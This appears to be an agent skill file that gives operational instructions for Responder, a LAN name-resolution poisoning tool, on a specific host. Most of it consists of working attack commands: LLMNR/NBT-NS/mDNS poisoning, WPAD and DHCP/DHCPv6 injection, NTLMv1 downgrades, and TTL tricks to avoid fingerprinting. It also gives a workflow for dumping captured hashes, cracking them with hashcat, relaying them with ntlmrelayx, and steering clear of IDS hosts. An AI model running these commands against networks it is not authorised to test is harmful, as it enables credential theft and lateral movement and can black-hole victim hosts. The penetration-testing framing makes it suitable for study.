---
name: responder
description: "Poison LLMNR, NBT-NS and mDNS plus rogue SMB/HTTP/LDAP/MSSQL servers to capture NetNTLM hashes, cleartext logons and WPAD proxy auth. Use when you have a foothold on a LAN segment and need credentials from name-resolution fallback traffic. Not for IPv6-only DNS takeover (use mitm6) and not for relaying, which belongs to ntlmrelayx."
---

# Responder

Responder answers broadcast and multicast name-resolution requests that Windows falls back to when DNS fails, then impersonates whatever service the client was trying to reach. The result is NetNTLMv1/v2 challenges, cleartext Basic/LDAP/FTP logons and, with WPAD, proxy authentication. On this host it lives at `/opt/repos/Responder` (fork at commit `424fbe5`, `Responder 3.2.2.0`) with no `responder` binary on `PATH`, only a zsh alias; always `cd` into the repo first because `Responder.conf`, `logs/` and `Responder.db` resolve relative to the install directory.

## When to use

| Goal | Mode | Command shape |
| --- | --- | --- |
| See what the segment talks without poisoning | analyze | `Responder.py -I eth0 -Av` |
| Capture NetNTLM hashes from typos and dead hosts | poison | `Responder.py -I eth0 -v` |
| Collect proxy auth from WPAD clients | `-P` | `Responder.py -I eth0 -Pv` |
| Inject WPAD via DHCP then catch proxy auth | `-d -P` | `Responder.py -I eth0 -Pvd` |
| Same but force the wpad.dat fetch to authenticate | `-wF` | `Responder.py -I eth0 -wFv` |
| IPv6 DNS takeover for hosts that ignore DHCP | `--dhcpv6` | `Responder.py -I eth0 --dhcpv6 -vP` |
| Accept only selected names or subnets | config | `Responder.conf` -> `RespondTo`, `RespondToName` |
| Feed relay instead of cracking | relay | `SMB = Off`, `HTTP = Off` + `ntlmrelayx.py` |

Responder is a capture tool. It cannot relay, cannot privilege-escalate a session and cannot forge tickets: hand the hashes to [hashcat](../hashcat/SKILL.md), or disable its servers and let [impacket](../impacket/SKILL.md) `ntlmrelayx.py` answer the same SMB/HTTP ports.

## Prerequisites

- Root. The poisoners use raw sockets and the servers bind 53/80/443/445/139/389/1433/21/25/110/3389; the README states root privileges are required and unprivileged runs fail with `Permission denied`.
- The host zsh profile defines `alias responder='sudo python3 /opt/repos/Responder/Responder.py'`; in a non-interactive shell call the interpreter path directly.
- `python3-netifaces`, `aioquic` (already installed for this checkout).
- Layer-2 adjacency to the victims. Across a router you see nothing; use mitm6/coercer instead.
- Confirm the version first, since this fork differs from upstream docs:

```sh
cd /opt/repos/Responder
python3 Responder.py --version        # Responder 3.2.2.0
```

## Core invocations

```sh
# 1. Passive scoping: log who asks for what, poison nothing
sudo python3 Responder.py -I eth0 -Av

# 2. Standard hash capture (LLMNR + NBT-NS + mDNS, all rogue servers)
sudo python3 Responder.py -I eth0 -v

# 3. Proxy auth only: most reliable capture against hardened modern clients
sudo python3 Responder.py -I eth0 -Pv

# 4. DHCP injects WPAD, proxy auth catches the CONNECT
sudo python3 Responder.py -I eth0 -Pvd

# 5. WPAD web server plus forced auth on wpad.dat (client may prompt a user)
sudo python3 Responder.py -I eth0 -wFv

# 6. IPv6 DNS takeover when hosts ignore DHCPv4 (can disrupt the segment)
sudo python3 Responder.py -I eth0 --dhcpv6 -vP

# 7. Answer as a different address than the interface's own
sudo python3 Responder.py -I eth0 -e 10.10.10.99 -v

# 8. Return STATUS_LOGON_FAILURE so clients fall back to WebDAV auth
sudo python3 Responder.py -I eth0 -Ev

# 9. Legacy downgrade: NTLMv1 / no ESS, only for old hosts
sudo python3 Responder.py -I eth0 --lm --disable-ess -v

# 10. Random TTL on poisoned answers, harder to fingerprint by TTL math
sudo python3 Responder.py -I eth0 -t random -v

# 11. Run on every interface at once (noisy, easy to overreach)
sudo python3 Responder.py -I ALL -v

# 12. Low-noise background capture; logs still land in ./logs
sudo python3 Responder.py -I eth0 -Q >/tmp/resp.out 2>&1 &

# 13. Harvest captured hashes out of the SQLite store as crackable files
cd /opt/repos/Responder && python3 DumpHash.py    # writes DumpNTLMv2.txt, DumpNTLMv1.txt

# 14. Crack what you captured (needs a working hashcat backend, see hashcat skill)
hashcat -m 5600 DumpNTLMv2.txt /opt/wordlists/rockyou.txt
```

Relay mode is a config change, not a flag: set `SMB = Off` and `HTTP = Off` under `[Responder Core]` in `Responder.conf`, then point `ntlmrelayx.py -tf relay.txt -smb2support` at the same segment.

## Flags that matter

| Flag | Effect | Note |
| --- | --- | --- |
| `-I` | interface, required for every mode including `-A` | `ALL` binds everything |
| `-A` | analyze only, no poisoning | writes `logs/Analyzer-Session.log` |
| `-d` | DHCPv4 answers with WPAD injected | does not answer hashes by itself |
| `-D` | DHCPv4 answers with attacker DNS | different effect from `-d` |
| `--dhcpv6` | DHCPv6 DNS takeover | help text warns `May disrupt network` |
| `-w` | start the WPAD rogue proxy | cannot be combined with `-P` |
| `-F` | force auth on `wpad.dat` retrieval | can show a credential prompt |
| `-P` | force proxy authentication | help calls it `Highly effective` |
| `-b` | HTTP Basic instead of NTLM | yields cleartext, logged separately |
| `--lm`, `--disable-ess` | NTLMv1 downgrade | only useful on XP/2003-era hosts |
| `-E` | return `STATUS_LOGON_FAILURE` | triggers WebDAV auth capture |
| `-e`, `-6` | poison with a chosen IPv4/IPv6 | for when the interface IP is wrong |
| `-t` | TTL for poisoned answers, hex or `random` | `30s = 1e` |
| `-N` | canonical name in LLMNR answers | used for Kerberos relay over HTTP |
| `-v`, `-Q` | verbose / quiet | `-v` is the practical default |

## Workflow

1. **Scope passively.** `-I <iface> -Av` for a few minutes. Read `logs/Analyzer-Session.log` to learn which hosts still leak NBT-NS/LLMNR and which names they ask for.
2. **Pick the smallest capture surface.** If WPAD names appear, `-P` alone is quieter than full poisoning. If only typo'd hostnames appear, plain poisoning is enough.
3. **Trim the config before a real run.** `RespondTo`/`DontRespondTo` restrict by subnet; `DontRespondToName` keeps you off NAC/IDS hostnames. `AutoIgnoreAfterSuccess = On` stops re-answering a host once you have its hash.
4. **Capture, then decide.** Hashes are cheap but noisy. If a hash belongs to a machine account or a service account with relay potential, switch to ntlmrelayx instead of cracking.
5. **Crack offline.** NetNTLMv2 is mode 5600. On this 2 vCPU box hashcat has no compute backend at the moment, so plan the crack for another host; see [hashcat](../hashcat/SKILL.md) for modes and rules.
6. **Collect artifacts.** `logs/SMB-NTLMv2-Client-*.txt`, `logs/HTTP-NTLMv2-Client-*.txt` and `Responder.db` are the evidence; `Responder-Session.log` is the timeline.
7. **Stop cleanly.** Ctrl-C restores nothing, so re-check the network: poisoned caches clear on TTL expiry, but a lingering `-d` DHCP run keeps answering.

## OPSEC and telemetry

- LLMNR/NBT-NS poisoning is loud by design: clients that fail name resolution emit failed DNS/NBT events, and any IDS with a poisoning signature fires on the first spoofed answer.
- `-b` captures cleartext passwords in `logs/HTTP-Clear-Text-Password-*.txt`; treat those files as engagement evidence and encrypt them.
- `--dhcpv6` and `-d` change client network configuration and can black-hole hosts; scope to a lab VLAN or a small `RespondTo` range.
- Hashes land on disk by default. `Responder-Session.log` and the SQLite DB both record victim IPs and usernames; delete or encrypt them after extraction.
- Relayed authentications show as normal 4624 logons on the *target*, not on the victim, so successful relay is quiet on the coerced host's log.

## Failure modes

| Symptom | Cause | Fix |
| --- | --- | --- |
| `Permission denied` on start | not root | `sudo`, or run from a root shell |
| `Address already in use` | `smbd`/`nmbd`, a web server, or a second Responder | `systemctl stop smbd nmbd`; `ss -tulpn \| grep -E '445\|80'` |
| `-I` error / usage printout | interface missing or misspelled | `ip -brief link` |
| Analyze mode is silent | no legacy resolution fallback on the segment | normal for DNS-clean networks; switch to mitm6 |
| Runs but no hashes | servers disabled in `Responder.conf` | check `SMB`/`HTTP`/`LDAP` are `On` |
| Only `$`-suffixed machine names | those are computer accounts, filtered by DumpHash | expected; machine hashes are still useful for relay |
| WPAD flags conflict | `-w` and `-P` are mutually exclusive | pick `-wF` or `-P` |
| IPv6 poisoning does nothing | IPv6 disabled on the victim or your box | `sysctl net.ipv6.conf.all.disable_ipv6` must be `0` |
| Hash file exists but hashcat rejects it | wrong `-m` mode (v1 vs v2) | `-m 5600` for NetNTLMv2, `-m 5500` for v1 |

## Verification

```sh
python3 /opt/repos/Responder/Responder.py --version     # Responder 3.2.2.0
python3 /opt/repos/Responder/Responder.py -h | head -20 # banner plus option group headings
ls /opt/repos/Responder/logs                            # per-protocol hash files appear after a capture
python3 -c "import sqlite3;print([r[0] for r in sqlite3.connect('/opt/repos/Responder/Responder.db').execute('select name from sqlite_master')])"
```

A healthy run prints the poisoner banner with every enabled service, then `[*] [LLMNR] Poisoned answer sent to ...` lines. Absence of those lines in `-v` means nothing on the segment is asking.

## Related skills

- [mitm6](../mitm6/SKILL.md) when the network is IPv6-capable and LLMNR is already off
- [hashcat](../hashcat/SKILL.md) to crack NetNTLMv2, NTLMv1 and Kerberos captures
- [kerbrute](../kerbrute/SKILL.md) to validate usernames seen in the captures
- [coercer](../coercer/SKILL.md) to force authentication from hosts that never broadcast
- [netexec](../netexec/SKILL.md) to use what you cracked